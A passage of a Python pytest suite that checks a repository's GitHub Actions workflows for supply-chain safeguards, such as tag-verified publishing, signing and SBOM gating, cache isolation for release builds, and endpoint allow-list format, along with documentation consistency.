    doc = load(WORKFLOWS / "python-package-release.yml")
    build = jobs(doc)["build"]
    verify = next(s for s in steps_of(build) if s.get("id") == "release-tag")
    assert verify["if"] == "inputs.publish"
    assert verify["env"] == {
        "REF": "${{ github.ref }}",
        "TAG": "${{ github.ref_name }}",
        "PREFIX": "${{ inputs.tag-prefix }}",
        "VERSION": "${{ steps.version.outputs.version }}",
    }
    assert '[[ "$REF" != refs/tags/* ]]' in verify["run"]
    assert '"$TAG" != "${PREFIX}${VERSION}"' in verify["run"]
    assert "echo 'verified=true' >> \"$GITHUB_OUTPUT\"" in verify["run"]
    assert build["outputs"]["release-tag-verified"] == "${{ steps.release-tag.outputs.verified }}"
    for name in ("publish-pypi", "github-release"):
        job = jobs(doc)[name]
        assert job["needs"] == "build"
        assert "startsWith(github.ref, 'refs/tags/')" in job["if"]
        assert "needs.build.outputs.release-tag-verified == 'true'" in job["if"]


def test_container_publication_is_blocked_before_registry_writes():
    doc = load(WORKFLOWS / "container-release.yml")
    release = jobs(doc)["release"]
    assert release["permissions"] == {"contents": "read", "security-events": "write"}
    steps = steps_of(release)
    refuse = steps[1]
    assert refuse["name"] == "Refuse unverified multi-arch publication"
    assert refuse["if"] == "inputs.push"
    assert "exit 1" in refuse["run"]
    assert "digest" in refuse["run"]
    assert steps.index(refuse) < min(
        i
        for i, step in enumerate(steps)
        if str(step.get("uses", "")).startswith(("actions/checkout@", "docker/login-action@"))
    )


def test_the_fixture_package_never_publishes():
    doc = load(EXAMPLES / "legacy-ci.yml")
    assert jobs(doc)["fixture-package"]["with"]["publish"] is False


def test_release_signs_attests_and_records_provenance_only_after_a_push():
    doc = load(WORKFLOWS / "container-release.yml")
    steps = {s.get("name"): s for s in steps_of(jobs(doc)["release"])}
    gated = (
        "Sign the image (keyless)",
        "Generate the SBOM with syft",
        "Attach the SBOM as a cosign attestation",
        "Record build provenance",
    )
    for name in gated:
        assert name in steps, f"release step {name!r} is missing"
        assert str(steps[name].get("if", "")).startswith("inputs.push"), f"{name!r} must be gated on inputs.push"
    push = steps["Build and push the multi-arch image"]
    assert push["with"]["provenance"] is False and push["with"]["sbom"] is False, (
        "BuildKit attestations would duplicate the explicit cosign/syft artefacts"
    )


def test_a_publishing_build_never_reads_the_actions_cache():
    """The cache is writable from any pull request; a poisoned layer in a signed release is unrecoverable."""
    doc = load(WORKFLOWS / "container-release.yml")
    steps = {s.get("name"): s for s in steps_of(jobs(doc)["release"])}
    push = steps["Build and push the multi-arch image"]["with"]
    assert "cache-from" not in push and "cache-to" not in push
    local = steps["Build for this runner and load it"]["with"]
    assert "!inputs.push" in local["cache-from"], "the local build may use the cache only when not publishing"


# --- documentation ----------------------------------------------------------


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_readme_documents_every_input(path):
    """The README is the interface; an input it does not mention does not exist to a caller."""
    if path.name == "scan-app.yml":
        pytest.skip("internal orchestrator, not a public caller API")
    text = README.read_text()
    inputs = triggers(load(path))["workflow_call"].get("inputs") or {}
    for name in inputs:
        assert f"`{name}`" in text, f"README.md does not document input `{name}` of {path.name}"


def test_readme_names_every_workflow_and_the_composite():
    text = README.read_text()
    for path in REUSABLE:
        assert path.name in text, f"README.md does not name {path.name}"
    assert ".github/actions/doppler-secrets" in text


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_the_default_allow_list_is_one_line_of_sorted_host_ports(path):
    """harden-runner reads allowed-endpoints as space-separated host:port entries.

    A newline in the default would make the agent match nothing; a wildcard
    invalidates the list. Sorted so a diff shows one added host, not a reorder.
    """
    inputs = triggers(load(path))["workflow_call"]["inputs"]
    if "allowed-endpoints" not in inputs:
        assert path.name == "scan-app.yml" or not any(steps_of(job) for job in jobs(load(path)).values())
        pytest.skip(f"{path.name} delegates scans; called workflows carry their endpoint lists")
    default = inputs["allowed-endpoints"]["default"]
    assert "\n" not in default, f"{path.name}: allowed-endpoints default contains a newline"
    entries = default.split(" ")
    assert entries == sorted(entries), f"{path.name}: allowed-endpoints default is not sorted"
    for entry in entries:
        assert re.fullmatch(r"[a-z0-9.-]+:\d+", entry), f"{path.name}: {entry!r} is not host:port"
    assert inputs["extra-allowed-endpoints"]["default"] == ""


# --- dogfooding ------------------------------------------------------------


def local_uses(job: dict) -> str | None:
    uses = str(job.get("uses", ""))
    return uses.removeprefix("./.github/workflows/").split(" ")[0] if uses.startswith("./.github/workflows/") else None


def dogfood_callers():
    """(own workflow, job, reusable workflow it calls at this ref).

    A reusable workflow that itself forwards to another through a `./`
    reference (scan-app.yml to the profiles) exercises that one too, at the
    same commit, so it is listed with the same caller.
    """
    found = []
    for path in [*OWN, *sorted(EXAMPLES.glob("*.yml"))]:
        for job_name, job in jobs(load(path)).items():
            target = local_uses(job)
            if not target:
                continue
            found.append((path.name, job_name, target))
            for nested in jobs(load(WORKFLOWS / target)).values():
                if local_uses(nested):
                    found.append((path.name, job_name, local_uses(nested)))
    return found


def test_repository_and_archived_examples_reference_existing_reusables():
    """Archived examples document interfaces but are no longer run by CI."""
    called = {reusable for _, _, reusable in dogfood_callers()}
    assert called <= {p.name for p in REUSABLE} | set(SAMPLE_STAGES), f"unknown local targets: {called}"
    assert "profile-secrets.yml" in called
    # scan-app is retained as a callable compatibility layer, no longer an active entrypoint.
    assert {p.name for p in REUSABLE} - {"scan-app.yml"} <= called, (
        f"unreferenced reusable: {sorted({p.name for p in REUSABLE} - called - {'scan-app.yml'})}"
    )


def test_the_fixture_release_never_publishes():
    doc = load(EXAMPLES / "legacy-ci.yml")
    job = jobs(doc)["fixture-release"]
    assert job["with"]["push"] is False


def test_the_fixture_ci_installs_under_require_hashes():
    doc = load(EXAMPLES / "legacy-ci.yml")
    install = jobs(doc)["fixture-ci"]["with"]["install-command"]
    assert "pip install --require-hashes -r apps/fixture/requirements.txt" in install


def test_this_repositorys_gate_needs_every_other_job():
    doc = load(WORKFLOWS / "ci-repo.yml")
    others = set(jobs(doc)) - {"security-green"}
    assert set(jobs(doc)["security-green"]["needs"]) == others


def test_ci_repo_anchors_paths_to_the_workspace_not_the_step_cwd():
    """A runner may start a step outside the checkout directory.

    Both jobs therefore pin the checkout to `$GITHUB_WORKSPACE`, resolve it once
    and test markers under `$workspace` instead of relying on `pwd`.
    """
    for name in ("workflow-lint", "test"):
        steps = steps_of(jobs(load(WORKFLOWS / "ci-repo.yml"))[name])
        checkout = next(s for s in steps if str(s.get("uses", "")).startswith("actions/checkout"))
        assert "path" not in checkout["with"], "an absolute checkout path nests under act"
        assert checkout["with"]["persist-credentials"] is True, "the partial clone needs auth to fetch blobs"
        resolve = next(s for s in steps if s.get("name") == "Resolve workspace")
        run = resolve["run"]
        assert 'git -C "$workspace" rev-parse --show-toplevel' in run
        assert 'fallback="$(git rev-parse --show-toplevel' in run, "no fallback when the workspace is wrong"
        assert "core.sparseCheckout" in run, "an inherited sparse checkout is not repaired"
        assert "config --worktree --unset-all core.sparseCheckout" in run, "the per-worktree setting is not cleared"
        assert '"$git_dir/config.worktree"' in run
        assert "--ignore-skip-worktree-bits" in run, "skip-worktree bits would still hide the files"
        assert "--no-skip-worktree" in run
        assert '"$workspace/$marker"' in run, "markers must be tested under $workspace"
        assert '"$GITHUB_ENV"' in run, "the resolved workspace must be exported"
        for step in steps:
            if "working-directory" in step:
                assert step["working-directory"] == "${{ env.WORKSPACE }}"


def test_the_runner_image_pins_its_inputs():
    """The runner container is the CI host: pin the base and verify the yq download."""
    text = (REPO / "Dockerfile.runner").read_text()
    base = next(line for line in text.splitlines() if line.startswith("FROM "))
    assert re.search(r"@sha256:[0-9a-f]{64}$", base), "base image is not pinned by digest"
    assert "ARG YQ_SHA256=" in text
    assert "sha256sum -c -" in text, "the yq download is not verified"


def test_the_lint_job_runs_zizmor_without_docker():
    """The runner user may not reach /var/run/docker.sock; run zizmor from a wheel."""
    doc = load(WORKFLOWS / "ci-repo.yml")
    assert "zizmorcore/zizmor-action" not in (WORKFLOWS / "ci-repo.yml").read_text()
    steps = steps_of(jobs(doc)["workflow-lint"])
    install = next(s for s in steps if s.get("name") == "Install pinned lint tools")
    assert "zizmor==1.30.1 --hash=sha256:" in install["run"]
    assert "--only-binary=:all:" in install["run"]
    run = next(s for s in steps if s.get("name") == "Run zizmor")["run"]
    assert "--persona pedantic" in run


def test_every_security_events_grant_is_documented():
    """zizmor's undocumented-permissions audit; a comment keeps the lint job green."""
    for path in WORKFLOW_FILES:
        for line in path.read_text().splitlines():
            if line.strip() == "security-events: write":
                assert "#" in line, f"{path.name}: security-events: write needs a comment"


def test_the_gate_reads_exceptions_from_a_dedicated_checkout():
    """A gate call must not leave the job workspace sparse for the next job."""
    steps = steps_of(jobs(load(WORKFLOWS / "security-gate.yml"))["gate"])
    checkout = next(s for s in steps if str(s.get("uses", "")).startswith("actions/checkout"))
    assert checkout["with"]["path"] == ".scan-repo"
    assert "sparse-checkout" in checkout["with"]
    read = next(s for s in steps if s.get("name") == "Read the exceptions")
    assert read["env"]["REPO"] == "${{ github.workspace }}/.scan-repo"
    assert '"$REPO/$file"' in read["run"], "the exceptions are not read from the checkout"
    require = next(s for s in steps if s.get("name") == "Require yq")
    assert "command -v yq" in require["run"], "a runner without yq must fail with a reason"


def test_ci_repo_test_job_resolves_every_checked_file():
    job = jobs(load(WORKFLOWS / "ci-repo.yml"))["test"]
    run = "\n".join(s.get("run", "") for s in steps_of(job))
    markers = next(line for line in run.splitlines() if "for marker in" in line)
    for path in ("pyproject.toml", "requirements-dev.txt", "tests/test_workflows.py"):
        assert path in markers, f"{path} is not checked"
    assert '"$workspace/$marker"' in run
    assert '"$WORKSPACE/requirements-dev.txt"' in run


ACTIONLINT_CONFIG = REPO / ".github" / "actionlint.yaml"
# Labels actionlint already knows; everything else must be declared by us.
ACTIONLINT_BUILTIN = {"self-hosted", "x64", "arm", "arm64", "linux", "macos", "windows"}


def test_custom_runner_labels_are_declared_for_actionlint():
    """actionlint only knows GitHub's hosted labels; custom ones must be listed."""
    used = set()
    for path in [*WORKFLOW_FILES, *sorted(EXAMPLES.glob("*.yml"))]:
        for job in jobs(load(path)).values():
            runs_on = job.get("runs-on")
            if isinstance(runs_on, list):
                used.update(str(label) for label in runs_on)
    custom = {
        label
        for label in used
        if label.lower() not in ACTIONLINT_BUILTIN and not label.lower().startswith(("ubuntu-", "windows-", "macos-"))
    }
    declared = set(yaml.safe_load(ACTIONLINT_CONFIG.read_text())["self-hosted-runner"]["labels"])
    assert custom == declared, f"actionlint labels out of sync: used={sorted(custom)}, declared={sorted(declared)}"


def test_actrc_maps_every_runner_label():
    """`.actrc` must cover every label so local runs need no -P flag."""
    labels = set()
    for path in [*WORKFLOW_FILES, *sorted(EXAMPLES.glob("*.yml"))]:
        for job in jobs(load(path)).values():
            runs_on = job.get("runs-on")
            if isinstance(runs_on, list):
                labels.update(str(label) for label in runs_on)
            elif isinstance(runs_on, str):
                labels.add(runs_on)
    assert labels, "no literal runs-on label found"
    rc = (REPO / ".actrc").read_text()
    for label in labels:
        assert f"-P {label}=" in rc, f".actrc does not map {label}"


# --- the usage guide ---------------------------------------------------------


def usage_snippet_jobs():
    """Every caller job in docs/USAGE.md's YAML snippets, except those marked PLANNED."""
    text = (REPO / "docs" / "USAGE.md").read_text()
    for block in re.findall(r"```yaml\n(.*?)```", text, re.S):
        if "PLANNED" in block:
            continue
        try:
            doc = yaml.safe_load(block)
        except yaml.YAMLError:
            continue  # a fragment (one job's `with:`), shown in context in the guide
        if not isinstance(doc, dict):
            continue
        for name, job in (doc.get("jobs") or {}).items():
            if isinstance(job, dict) and "/.github/workflows/" in str(job.get("uses", "")):
                yield name, job


def test_the_usage_guide_calls_only_workflows_and_inputs_that_exist():
    """An example that names a missing input fails at the caller's first run; it fails here first."""
    checked = 0
    for name, job in usage_snippet_jobs():
        target = str(job["uses"]).split("/.github/workflows/")[1].split("@")[0]
        path = WORKFLOWS / target
        assert path.is_file(), f"docs/USAGE.md job {name!r} calls {target}, which does not exist"
        call = triggers(load(path))["workflow_call"]
        unknown = set(job.get("with") or {}) - set(call.get("inputs") or {})
        assert not unknown, f"docs/USAGE.md job {name!r}: {target} has no input(s) {sorted(unknown)}"
        undeclared = set(job.get("secrets") or {}) - set(call.get("secrets") or {})
        assert not undeclared, f"docs/USAGE.md job {name!r}: {target} declares no secret(s) {sorted(undeclared)}"
        checked += 1
    assert checked >= 10, f"only {checked} snippet jobs found; did the guide's format change?"
